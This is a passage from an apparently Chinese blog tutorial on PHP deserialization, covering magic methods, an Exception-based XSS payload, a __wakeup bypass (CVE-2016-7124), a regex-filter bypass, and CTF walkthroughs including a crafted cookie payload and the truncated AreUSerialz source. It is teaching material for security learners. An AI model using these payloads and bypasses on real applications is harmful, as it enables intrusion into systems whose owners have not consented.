<span class="token string double-quoted-string">"调用了构造函数&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"调用了析构函数&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"调用了苏醒函数&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"创建对象a&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Abc</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"序列化&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$a_s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"反序列化&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$a_un</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a_s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"对象快死了"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述代码的结果为</p><pre class="line-numbers language-none"><code class="language-none">创建对象a调用了构造函数序列化反序列化调用了苏醒函数对象快死了调用了析构函数调用了析构函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们来解析一下，首先对象的创建，调用了构造器__construct，序列化会调用sleep()，但是这里没有。反序列化调用__wakeup()，此方法调用后会调用析构方法一次，最后程序结束，调用析构方法。</p><h5 id="toString的使用"><a href="#toString的使用" class="headerlink" title="toString的使用"></a>toString的使用</h5><blockquote><p>打印一个对象时，如果定义了__toString()方法，就能在测试时，通过echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。如果没有这个方法，那么echo一个对象时，就会报错Object of class Account could not be converted to string，实际上这是一个类型匹配失败的错误。不过仍然可以用print_r()和var_dump()函数输出一个对象。当然__toString()是可以定制的，所提供的信息和样式更加丰富</p></blockquote><p>所以，toString一般会在当对象被当做字符串时被调用。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$test</span>  <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"调用了构造函数&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"调用了析构函数&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"调用了苏醒函数&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"调用了toString&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"返回了toString&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">调用了构造函数调用了苏醒函数调用了toString返回了toString调用了析构函数调用了析构函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们可以很明显的看出序列化与反序列化是一正一反，互逆。</p><p>同时，我们可以想一下$KEY=123序列化后是什么。</p><p>看了上面的描述，我第一反应就是i:3:”123”;，然而这不对，结果是什么呢？</p><p><strong>i:123</strong>记住就好了。</p><h2 id="原生类的利用"><a href="#原生类的利用" class="headerlink" title="原生类的利用"></a>原生类的利用</h2><p>实际利用是经常会遇到没有合适的利用链，这就需要利用自带的原生类。</p><h3 id="call-方法"><a href="#call-方法" class="headerlink" title="__call()方法"></a>__call()方法</h3><p>__call魔术方法是在调用不存在的类方法时将会触发。该方法有两个参数，第一个参数自动接受不存在的方法名，第二个参数接受不存在方法中的参数。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token comment">// 注意: $name 的值区分大小写</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Calling object method '<span class="token interpolation"><span class="token variable">$name</span></span>' "</span>             <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">', '</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">-></span><span class="token function">notexist</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">Calling <span class="token keyword type-declaration">object</span> method <span class="token string single-quoted-string">'notexist'</span> <span class="token number">1</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="SoapClient-call"><a href="#SoapClient-call" class="headerlink" title="SoapClient::__call"></a>SoapClient::__call</h4><blockquote><p>public SoapClient::__call(string $name, array $args): mixed<br>Calling this method directly is deprecated. Usually, SOAP functions can be called as methods of the SoapClient object; in situations where this is not possible or additional options are needed, use SoapClient::__soapCall().</p></blockquote><p>这里可以进行ssrf攻击，但是我实在不怎么了解。之后，再研究。</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h3><p>可以与xss结合，主要利用的Exception对错误信息没有过滤，在构造Exploit时，将XSS代码作为它的参数即可</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span>  <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert(/hello world/)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h3><p>通常情况下，反序列化是无法调用__construct()的，但是经过开发者的魔改便肯呢个存在任意类实例化的情况。可以使用call_user_func_array、call_user_func调用构造方法。具体的方式遇到再说吧，我是在没怎么搞懂</p><h4 id="call-user-func-array、call-user-func"><a href="#call-user-func-array、call-user-func" class="headerlink" title="call_user_func_array、call_user_func"></a>call_user_func_array、call_user_func</h4><blockquote><p>call_user_func(callable $callback, mixed $parameter = ?, mixed $… = ?): mixed<br>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p></blockquote><blockquote><p>call_user_func_array(callable $callback, array $param_arr): mixed<br>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p></blockquote><p>简单的说就是就是将方法作为参数去调用它。</p><p>在php可用作链式调用，如下面的代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">StringHelper</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">private</span> <span class="token variable">$value</span><span class="token punctuation">;</span>     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string single-quoted-string">'arg is :'</span><span class="token operator">.</span><span class="token variable">$args</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用外部的trim()方法,传入2个参数</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">function</span> <span class="token function-definition function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringHelper</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hi boys and girls ! "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token operator">-></span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个程序的目的就是计算字符串的长度。但是，这个字符串最后有空格，我们希望将空格去除掉然后计算其长度。这个程序就使用链式调用的方式。</p><p>首先，创建一个对象实例，并将字符串作为参数传入构造器中。构造器将属性输出化为输入的字符串，之后便是echo语句。因为trim在这个类中并不存在，所以会调用call方法，__call方法将方法名trim以及” “作为参数，传入了call_user_func($function, $this-&gt;value, $args[0])。call_user_func会调用回调函数，trim，以属性value以及” “作为参数，从而成功将字符串去除空格。最后，他又调用了strlen计算长度。</p><p>但是，我当时就在想，为什么要这么做？直接调用函数不好吗？于是上网查询一些资料，基本有两个说法。一是符合封装的思想，二是便于异步运行。我就懵了，这咋就符合封装了，直接调用不也符合封装吗。。。。没搞明白，之后编程遇到了再说。</p><h3 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h3><h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><h3 id="wakeup失效：CVE-2016-7124"><a href="#wakeup失效：CVE-2016-7124" class="headerlink" title="__wakeup失效：CVE-2016-7124"></a>__wakeup失效：CVE-2016-7124</h3><p>影响版本为PHP5至5.6.25，PHP7至7.0.10</p><p>原因：当属性个数不正确时，不会调用wakeup</p><h3 id="bypass反序列化正则"><a href="#bypass反序列化正则" class="headerlink" title="bypass反序列化正则"></a>bypass反序列化正则</h3><p>当执行反序列化时，使用正则”/[oc]: \d+:/i”进行拦截，只要拦截O:4:</p><p>PHP中支持O:+所以可以利用这点进行绕过。</p><h3 id="反序列化字符逃逸-CVE-2015-8562"><a href="#反序列化字符逃逸-CVE-2015-8562" class="headerlink" title="反序列化字符逃逸(CVE-2015-8562)"></a>反序列化字符逃逸(CVE-2015-8562)</h3><p>这里可以见我另一篇文章中的 <a href="https://violetbk.github.io/2021/09/27/gong-fang-shi-jie-unserialize/#toc-heading-5">easy_serialize_php</a></p><h3 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a>Session反序列化</h3><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>下面我们来做两道CTF题，来对知识进行巩固。</p><h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><p>源码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ISecer'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hint'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$KEY</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin.css<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token punctuation">&#125;</span><span class="token variable">$KEY</span><span class="token operator">=</span><span class="token string single-quoted-string">'ISecer:www.isecer.com'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看了源码，第一反应先将KEY进行序列化，结果为s:21:”ISecer:<a href="http://www.isecer.com&quot;;，然后将结果发送ISecer:s:21:&quot;ISecer:www.isecer.com&quot;;。">www.isecer.com&quot;;，然后将结果发送ISecer:s:21:&quot;ISecer:www.isecer.com&quot;;。</a></p><p>然后结果不对，然后我就纳闷了，这是咋回事。然后仔细一看源码，明白了。$KEY在最后，而比较在上面，所以很明显$KEY在比较时为空，我们必须重新构造payload：ISecer:s:0:””;</p><p>结果正确。</p><h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span 